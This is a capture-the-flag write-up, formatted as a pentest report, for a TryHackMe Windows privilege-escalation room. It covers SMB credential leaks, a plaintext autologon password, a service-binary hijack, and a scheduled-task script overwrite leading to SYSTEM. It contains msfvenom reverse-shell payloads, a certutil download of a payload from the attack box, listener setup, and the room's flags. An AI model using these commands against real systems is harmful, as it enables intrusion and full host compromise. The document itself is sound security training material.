# Pentest Report — THMWindowsJump

## 1. Summary

- **Target:** 10.48.167.191
- **Objective:** Escalate from guest access through a misconfigured Windows workstation left behind after a round of layoffs, moving laterally across accounts: `guest` → `thmuser` → `notadmin` → `svcadmin` → `SYSTEM`.
- **Category:** Windows privilege escalation / lateral movement
- **Status:** Complete
- **Outcome:** Escalated the full chain from anonymous SMB access to SYSTEM, capturing all 4 flags: `guest` → `thmuser` → `notadmin` → `svcadmin` → `SYSTEM`.

## 2. Scope & Environment

| Item | Value |
|---|---|
| Target IP | 10.48.167.191 |
| Attack box IP | 10.48.92.22 |
| Challenge name | THMWindowsJump |
| Category | Windows privesc / lateral movement |
| Date started | 2026-09-29 |

Room description: a routine vulnerability scan flagged a Windows machine on the internal network — a standard workstation left behind after a round of layoffs that IT never cleaned up properly. The intended path is to move laterally from guest access all the way to SYSTEM: `guest` → `thmuser` → `notadmin` → `svcadmin` → `SYSTEM`.

## 3. Methodology / Timeline

Chronological log of actions taken, in order. Filled in as the engagement progresses.

### 2026-09-29 — Initial recon

- Ran `nmap -sC -sV 10.48.167.191`:

| Port | Service | Details |
|---|---|---|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | (unidentified version) |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services (RDP) |

- Additional script output:
  ```
  ssl-cert: Subject: commonName=privesc
  rdp-ntlm-info:
    Target_Name: PRIVESC
    NetBIOS_Domain_Name: PRIVESC
    NetBIOS_Computer_Name: PRIVESC
    DNS_Domain_Name: privesc
    DNS_Computer_Name: privesc
    Product_Version: 10.0.17763 (Windows Server 2019 / Windows 10 1809 build)
  smb2-security-mode:
    3:1:1:
      Message signing enabled but not required
  ```
- Hostname/domain is `PRIVESC`. SMB message signing is enabled but not required — potential relay surface. No AD domain controller ports observed; appears to be a standalone workstation.
- Listed SMB shares with a null session:
  ```
  smbclient -L //10.48.167.191 -N

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
  Public          Disk      Public file share
  ```
  Null-session share listing succeeded. `Public` is a non-default share worth investigating.
- Connected to the `Public` share with a null session:
  ```
  smbclient //10.48.167.191/Public -N
  Try "help" to get a list of possible commands.
  smb: \>
  ```
  Connection succeeded, confirming anonymous/guest access to `Public`.
- Listed and downloaded the file inside:
  ```
  smb: \> ls
  welcome.txt                         A      177  Mon May 11 06:40:50 2026
  smb: \> get welcome.txt
  getting file \welcome.txt ...
  ```
- Read the downloaded file:
  ```
  cat welcome.txt
  Welcome to CORP-NET.

  New employee default credentials
  ================================
  Username : thmuser
  Password : Password1!

  Please change your password after first login.
  ```
- Found credentials for `thmuser` (`Password1!`) exposed on the anonymously-accessible `Public` share.
- Connected via RDP using the recovered credentials:
  ```
  mkdir share
  xfreerdp /v:10.48.167.191 /u:'thmuser' /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:share,/share
  ```
- RDP session succeeded, landing on the `PRIVESC` desktop as `thmuser`. Confirms the `F1` credentials are valid for interactive login.
- Opened PowerShell and confirmed identity:
  ```
  PS C:\Users\thmuser.PRIVESC> whoami
  privesc\thmuser
  ```
  Home directory only contains default user folders (3D Objects, Documents, Desktop, etc.) — nothing unusual at first glance.
- Checked `C:\Users` for other accounts:
  ```
  PS C:\Users> ls
  Administrator
  notadmin
  notadmin.PRIVESC
  Public
  svcadmin
  svcadmin.PRIVESC
  thmuser
  thmuser.PRIVESC
  ```
  Confirms all accounts named in the room's objective chain exist on the box.
- Found and read the first flag on `thmuser`'s desktop:
  ```
  PS C:\Users\thmuser\Desktop> ls
  flag1.txt

  PS C:\Users\thmuser\Desktop> type flag1.txt
  THM{5mb_cr3d5_1n_th3_5h4r3}
  ```

### 2026-09-29 — Enumeration as thmuser

- Checked stored credentials:
  ```
  cmdkey /list
  Currently stored credentials:
  * NONE *
  ```
  No cached credentials found.
- Re-checked via `cmd.exe` (`cmdkey /list`):
  ```
  C:\Users\thmuser.PRIVESC>cmdkey /list

  Currently stored credentials:

      Target: Domain:interactive=PRIVESC\notadmin
      Type: Domain Password
      User: PRIVESC\notadmin
  ```
  This time a stored credential entry for `PRIVESC\notadmin` was present (target type `Domain:interactive`, no password value shown by `cmdkey`).
- Attempted to use the stored credential via `runas /savecred`:
  ```
  runas /savecred /user:notadmin cmd.exe
  Attempting to start cmd.exe as user "PRIVESC\notadmin" ...
  Enter the password for notadmin:
  Attempting to start cmd.exe as user "PRIVESC\notadmin" ...
  RUNAS ERROR: Unable to run - cmd.exe
  1326: The user name or password is incorrect.
  ```
  The saved credential did not authenticate successfully; `runas` prompted for a password interactively.
- Checked the Winlogon registry key for autologon credentials:
  ```
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  ...
  AutoAdminLogon    REG_SZ    1
  DefaultUserName    REG_SZ    notadmin
  DefaultPassword    REG_SZ    P@ssw0rd!
  AutoLogonSID    REG_SZ    S-1-5-21-1966530601-3185510712-10604624-1009
  LastUsedUsername    REG_SZ    notadmin
  ```
  Autologon is enabled with a plaintext password stored in the registry: `notadmin` / `P@ssw0rd!`.
- Tried a `runas` attempt against an unrelated `admin` account first (failed), then used the recovered `notadmin` credentials:
  ```
  runas /savecred /user:admin cmd.exe
  RUNAS ERROR: Unable to run - cmd.exe
  1326: The user name or password is incorrect.

  runas /user:privesc\notadmin cmd.exe
  Enter the password for privesc\notadmin:
  Attempting to start cmd.exe as user "privesc\notadmin" ...
  ```
- Confirmed the new shell's identity:
  ```
  C:\Windows\system32>whoami
  privesc\notadmin
  ```
- Confirmed shell access as `notadmin`.
- Read the flag from `notadmin`'s desktop:
  ```
  C:\Users\notadmin\Desktop>type flag2.txt
  THM{w1nl0g0n_cr3ds_3xp0s3d}
  ```

### 2026-09-29 — Enumeration as notadmin

- Searched scheduled tasks for `svcadmin` (no results), then checked services:
  ```
  schtasks /query | findstr -i "svcadmin*"
  schtasks /query | findstr /i "svcadmin"

  wmic service get name,pathname,startname | find /i "svcadmin"
  THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
  ```
  Found a service `THMSvc` running as `svcadmin`, binary at `C:\Windows\THMSVC\svc.exe`.
- Checked file permissions on the service binary:
  ```
  icacls C:\Windows\THMSVC\svc.exe
  C:\Windows\THMSVC\svc.exe Everyone:(F)
                            PRIVESC\notadmin:(I)(F)
                            BUILTIN\Administrators:(I)(F)
                            NT AUTHORITY\SYSTEM:(I)(F)
  ```
  `Everyone:(F)` — full control (read/write/execute/delete) granted to any authenticated user on the binary that runs as `svcadmin`.
- Generated a Windows service-executable reverse shell payload on the attack box:
  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.48.92.22 LPORT=4444 -f exe-service -o svc.exe
  Payload size: 460 bytes
  Final size of exe-service file: 5632 bytes
  Saved as: svc.exe
  ```
- Started `msfconsole` and configured a `multi/handler`:
  ```
  msf exploit(multi/handler) > set LHOST 10.48.92.22
  LHOST => 10.48.92.22
  msf exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
  payload => windows/x64/shell_reverse_tcp
  ```
  Verified options:
  ```
  msf exploit(multi/handler) > options
  LHOST     10.48.92.22
  LPORT     4444
  ```
  Started the handler as a background job:
  ```
  msf exploit(multi/handler) > exploit -j
  [*] Exploit running as background job 0.
  [*] Started reverse TCP handler on 10.48.92.22:4444
  ```
- Checked network drive mappings on the target:
  ```
  C:\>net use
  Status       Local     Remote                    Network
  -------------------------------------------------------------------------------
                          \\TSCLIENT\_share         Microsoft Terminal Services
  ```
  The RDP-mapped `share` drive (from `/drive:share,/share` in the `xfreerdp` command) is available as `\\TSCLIENT\_share`, providing a way to transfer files (e.g. `svc.exe`) onto the target.
- Moved the payload into the mapped share directory on the attack box:
  ```
  mv svc.exe share/svc.exe
  cd share/
  ls
  svc.exe
  ```
- Overwrote the `THMSvc` service binary with the payload, exploiting the `Everyone:(F)` permission found earlier:
  ```
  C:\>copy \\TSCLIENT\_share\svc.exe C:\Windows\THMSVC\svc.exe
  Overwrite C:\Windows\THMSVC\svc.exe? (Yes/No/All): Yes
          1 file(s) copied.
  ```
- Started the service to trigger execution of the payload:
  ```
  C:\>sc stop THMSvc
  [SC] ControlService FAILED 1062:
  The service has not been started.

  C:\>sc start THMSvc
  SERVICE_NAME: THMSvc
          STATE              : 4  RUNNING
          PID                : 5612
  ```
- Caught the resulting session on the metasploit handler:
  ```
  [*] Command shell session 1 opened (10.48.92.22:4444 -> 10.48.167.191:50689) at 2026-09-29 09:34:01 +0000
  msf exploit(multi/handler) > sessions -i 1
  C:\Windows\system32>whoami
  privesc\svcadmin
  ```
- Confirmed shell access as `svcadmin`.
- Read the flag from `svcadmin`'s desktop:
  ```
  C:\Users\svcadmin\Desktop>type flag3.txt
  THM{s3rv1c3_b1n4ry_h1j4ck3d}
  ```

### 2026-09-29 — Enumeration as svcadmin

- Ran `dir` on `C:\Windows` for general enumeration — standard directory listing, no notable non-default files identified beyond the already-known `THMSVC` folder.
- Checked `C:\Windows\Tasks`:
  ```
  dir
  cleanup.bat        41 bytes
  ```
  Found a non-default file, `cleanup.bat`.
- Checked permissions on `cleanup.bat`:
  ```
  icacls cleanup.bat
  cleanup.bat BUILTIN\Users:(I)(RX)
              PRIVESC\svcadmin:(I)(M)
              BUILTIN\Administrators:(I)(F)
              NT AUTHORITY\SYSTEM:(I)(F)
  ```
  `svcadmin` has Modify `(M)` permission on the file (read/write/execute/delete, though not full ACL control).
- Read the file's contents:
  ```
  type cleanup.bat
  @echo off
  del /Q /F "%TEMP%\*.tmp" 2>nul
  ```
  A simple cleanup batch script, currently just deleting `.tmp` files in `%TEMP%`.
- Attempted to check for a related scheduled task/service (typo'd `findsrt` instead of `findstr`), and the session closed:
  ```
  wmic service get name,pathname,startname | findsrt /i "cleanup.txt"

  [*] 10.48.167.191 - Command shell session 1 closed.  Reason: User exit
  ```
- Re-established shell access as `svcadmin` (via the `THMSvc` service, F3) after the session dropped.
- Searched services for a reference to `cleanup`:
  ```
  wmic service get name,pathname,startname | findstr /i "cleanup"
  ```
  No matching service found — `cleanup.bat` is not directly registered as a service.
- Searched scheduled tasks for a reference to `cleanup`:
  ```
  schtasks /query | findstr -i "cleanup"
  CleanupTemporaryState                    N/A                    Ready
  DsSvcCleanup                             N/A                    Ready
  Pre-staged app cleanup                   N/A                    Disabled
  Folder: \Microsoft\Windows\DiskCleanup
  SilentCleanup                            N/A                    Ready
  CleanupOldPerfLogs                       N/A                    Ready
  StartComponentCleanup                    N/A                    Ready
  Account Cleanup                          N/A                    Disabled
  Windows Defender Cleanup                 N/A                    Ready
  ```
  Several built-in Windows scheduled tasks matched the keyword, but none of them are obviously `Tasks\cleanup.bat` by name.
- Attempted to query `CleanupTemporaryState` in detail, but the terminal appears to have echoed/re-executed the earlier `cleanup.bat` contents as literal commands, producing errors:
  ```
  C:\Windows\Tasks>@echo off
  del /Q /F "%TEMP%\*.tmp" 2>nul

  C:\Windows\Tasks>schtasks /query /tn CleanupTemporaryState /fo list /v
  'C:\Windows\Tasks' is not recognized as an internal or external command, ...
  ERROR: The system cannot find the path specified.
  ```
- Attack box froze mid-session, paused, then recovered. Continuing.
- Retried querying scheduled tasks for `cleanup`:
  ```
  schtasks /query /tv /fo list | findstr /i "cleanup" /c "TaskName"
  ERROR: Invalid argument/option - '/tv'.

  schtasks /query /tn CleanupTemporaryState /fo list /v
  ERROR: The system cannot find the path specified.

  schtasks /query | findstr -i "cleanup"
  CleanupTemporaryState                    N/A                    Ready
  DsSvcCleanup                             N/A                    Ready
  Pre-staged app cleanup                   N/A                    Disabled
  Folder: \Microsoft\Windows\DiskCleanup
  SilentCleanup                            N/A                    Ready
  CleanupOldPerfLogs                       N/A                    Ready
  StartComponentCleanup                    N/A                    Ready
  Account Cleanup                          N/A                    Disabled
  Windows Defender Cleanup                 N/A                    Ready
  ```
  `/tv` is not a valid `schtasks /query` flag, and `/tn CleanupTemporaryState` failed to resolve the task path directly. Same list of built-in tasks as before.
- Generated a standalone `.exe` reverse shell payload on the attack box and served it over HTTP:
  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.48.92.22 LPORT=4445 -f exe -o shell.exe
  Payload size: 460 bytes
  Final size of exe file: 7680 bytes
  Saved as: shell.exe

  python3 -m http.server
  Serving HTTP on 0.0.0.0 port 8000 ...
  ```
- Attempted to pull it onto the target with `wget`:
  ```
  echo %cd%
  C:\Users\svcadmin
  wget http://10.4892.22:8000/shell.exe
  'wget' is not recognized as an internal or external command, operable program or batch file.
  ```
- Retried with `certutil`:
  ```
  certutil -urlcache -split -f http://10.48.92.22:8000/shell.exe C:\Windows\Tasks\shell.exe
  ****  Online  ****
  CertUtil: -URLCache command completed successfully.
  ```
  Downloaded `shell.exe` into `C:\Windows\Tasks\`.
- Listed `C:\Windows\Tasks` to confirm:
  ```
  Directory of C:\Windows\Tasks
  @echo                            0
  cleanup.bat                     41
  schtasks                         0
  shell.exe                    7,680
  type                              0
  ```
  Confirms `shell.exe` is present. Also visible: three stray zero-byte files (`@echo`, `schtasks`, `type`) — leftover artifacts from the earlier misparsed/re-executed `cleanup.bat` content.
- Overwrote `cleanup.bat` (writable by `svcadmin` per earlier `icacls` check) to point at the reverse shell payload:
  ```
  powershell
  PS C:\Windows\Tasks> cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
  PS C:\Windows\Tasks> ls
  cleanup.bat    29 bytes
  shell.exe    7680 bytes

  PS C:\Windows\Tasks> type cleanup.bat
  C:\Windows\Tasks\shell.exe
  ```
- Set up a listener and waited for whatever scheduled task runs `cleanup.bat` to fire:
  ```
  nc -lvp 4445
  Connection received on ip-10-48-167-191.ap-south-1.compute.internal 51194
  Microsoft Windows [Version 10.0.17763.1821]

  C:\Windows\system32>whoami
  nt authority\system
  ```
- Confirmed shell access as `NT AUTHORITY\SYSTEM`.
- Read the final flag from `C:\`:
  ```
  C:\>type flag4.txt
  THM{t4sk_wr1t3_t0_SYST3M}
  ```

## 4. Findings

_(One entry per vulnerability/technique. Filled in as discovered.)_

Severity methodology: CVSS v3.1 base score, computed with the official FIRST.org calculator. Bands: 9.0-10.0 Critical, 7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low.

### F1 — Credentials Exposed via Anonymously-Accessible SMB Share
- **Affected asset:** SMB `Public` share on 10.48.167.191:445
- **Severity:** Critical — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`, 9.1
- **Description:** The `Public` SMB share allows null-session (unauthenticated/guest) access and contains a file with a live username/password pair for a domain account.
- **Evidence:**
  ```
  smbclient //10.48.167.191/Public -N
  smb: \> get welcome.txt

  cat welcome.txt
  Username : thmuser
  Password : Password1!
  ```
- **Impact:** Unauthenticated attacker can obtain valid domain credentials for `thmuser`, the first stage of the intended lateral-movement chain.
- **How found:** `smbclient -L` with a null session listed shares including a non-default `Public` share; connecting to it anonymously and downloading its contents revealed the credential file.
- **Recommendation:**

### F2 — Plaintext AutoLogon Password in Registry Exposes notadmin Credentials
- **Affected asset:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- **Severity:** High — CVSS 3.1: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, 7.8
- **Description:** The Winlogon registry key has `AutoAdminLogon` enabled with `DefaultUserName`/`DefaultPassword` set in plaintext, exposing valid credentials for `notadmin` to any local user able to query the registry.
- **Evidence:**
  ```
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  AutoAdminLogon    REG_SZ    1
  DefaultUserName    REG_SZ    notadmin
  DefaultPassword    REG_SZ    P@ssw0rd!
  ```
- **Impact:** Any authenticated local user can read plaintext credentials for `notadmin` from the registry, the second stage of the intended lateral-movement chain.
- **How found:** A `runas /savecred` attempt against a `cmdkey`-cached `notadmin` credential failed; queried the Winlogon autologon registry key next, a standard place to check for autologon misconfigurations, and found the plaintext password there.
- **Recommendation:**

### F3 — World-Writable Service Binary Enables Escalation to svcadmin
- **Affected asset:** `C:\Windows\THMSVC\svc.exe`, `THMSvc` service (runs as `svcadmin`)
- **Severity:** High — CVSS 3.1: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, 7.8
- **Description:** The `THMSvc` service, configured to run as `svcadmin`, has its executable file (`svc.exe`) granted `Everyone:(F)` (full control) via NTFS permissions. Any authenticated user can overwrite the binary with arbitrary code, which then executes with the service account's privileges the next time the service starts.
- **Evidence:**
  ```
  wmic service get name,pathname,startname | find /i "svcadmin"
  THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin

  icacls C:\Windows\THMSVC\svc.exe
  C:\Windows\THMSVC\svc.exe Everyone:(F)

  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.48.92.22 LPORT=4444 -f exe-service -o svc.exe
  copy \\TSCLIENT\_share\svc.exe C:\Windows\THMSVC\svc.exe
  sc start THMSvc
  ```
  Result: reverse shell caught as `svcadmin`.
- **Impact:** Privilege escalation from `notadmin` to `svcadmin` via a world-writable service binary.
- **How found:** `wmic service` identified the service and its execution account; `icacls` on the binary revealed the `Everyone:(F)` grant.
- **Recommendation:**

### F4 — Writable Scheduled-Task Script Enables Escalation to SYSTEM
- **Affected asset:** `C:\Windows\Tasks\cleanup.bat`, invoked by a scheduled task (likely `CleanupTemporaryState`, running as SYSTEM)
- **Severity:** High — CVSS 3.1: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, 7.8
- **Description:** `cleanup.bat`, located in `C:\Windows\Tasks`, is writable by `svcadmin` (`icacls` showed `Modify` permission). The file is executed by a scheduled task that runs as `NT AUTHORITY\SYSTEM`. Overwriting the batch file's contents with a path to an attacker-controlled executable results in that executable running with SYSTEM privileges on the task's next trigger.
- **Evidence:**
  ```
  icacls cleanup.bat
  cleanup.bat PRIVESC\svcadmin:(I)(M)

  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.48.92.22 LPORT=4445 -f exe -o shell.exe
  certutil -urlcache -split -f http://10.48.92.22:8000/shell.exe C:\Windows\Tasks\shell.exe

  cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
  ```
  Result: reverse shell caught as `NT AUTHORITY\SYSTEM`.
- **Impact:** Full privilege escalation from `svcadmin` to SYSTEM, complete compromise of the host.
- **How found:** `C:\Windows\Tasks` directory listing revealed a non-default `cleanup.bat` file; `icacls` showed it was writable by `svcadmin`; `schtasks /query` cross-referencing suggested it corresponded to a built-in cleanup task running as SYSTEM.
- **Recommendation:**

## 5. Exploitation Chain

1. Recon with nmap identified SMB (445, message signing enabled but not required) and RDP (3389) on a standalone host (`PRIVESC`).
2. Null-session SMB listing revealed a non-default `Public` share; connecting anonymously and downloading `welcome.txt` disclosed valid credentials for `thmuser` (F1).
3. Used those credentials to RDP in as `thmuser`, capturing the first flag directly on the desktop.
4. `cmdkey /list` as `thmuser` showed a cached credential reference for `notadmin`; a `runas /savecred` attempt against it failed, but querying the Winlogon autologon registry key revealed a plaintext password for `notadmin` (F2), used via `runas` to obtain a shell as `notadmin`.
5. Service enumeration (`wmic service`) identified `THMSvc`, running as `svcadmin`; `icacls` showed the service binary was writable by `Everyone`. Overwrote it with a `msfvenom`-generated service-executable payload (transferred via the RDP-mapped drive) and restarted the service, escalating to `svcadmin` (F3).
6. Enumeration of `C:\Windows\Tasks` as `svcadmin` found a writable `cleanup.bat` executed by a built-in scheduled task running as SYSTEM. Overwrote the batch file to point at a `msfvenom`-generated executable (transferred via `certutil`), and the task's next trigger executed it as `NT AUTHORITY\SYSTEM` (F4), completing the chain and yielding the final flag from `C:\flag4.txt`.

## 6. Flag & Proof

- **Flag 1 (thmuser):** `THM{5mb_cr3d5_1n_th3_5h4r3}`
- **Proof:** RDP session obtained as `thmuser` via credentials exposed on the anonymous SMB `Public` share (F1); flag read from `Desktop\flag1.txt`.
- **Flag 2 (notadmin):** `THM{w1nl0g0n_cr3ds_3xp0s3d}`
- **Proof:** Shell obtained as `notadmin` via plaintext autologon credentials in the registry (F2); flag read from `Desktop\flag2.txt`.
- **Flag 3 (svcadmin):** `THM{s3rv1c3_b1n4ry_h1j4ck3d}`
- **Proof:** Shell obtained as `svcadmin` via world-writable service binary hijack of `THMSvc` (F3); flag read from `Desktop\flag3.txt`.
- **Flag 4 (SYSTEM):** `THM{t4sk_wr1t3_t0_SYST3M}`
- **Proof:** Shell obtained as `NT AUTHORITY\SYSTEM` via writable scheduled-task script `cleanup.bat` (F4); flag read from `C:\flag4.txt`.

## 7. Remediation

_(Optional — fill in if the challenge expects defensive recommendations.)_

## 8. Appendix

_(Raw command output, scripts, screenshots referenced from findings.)_
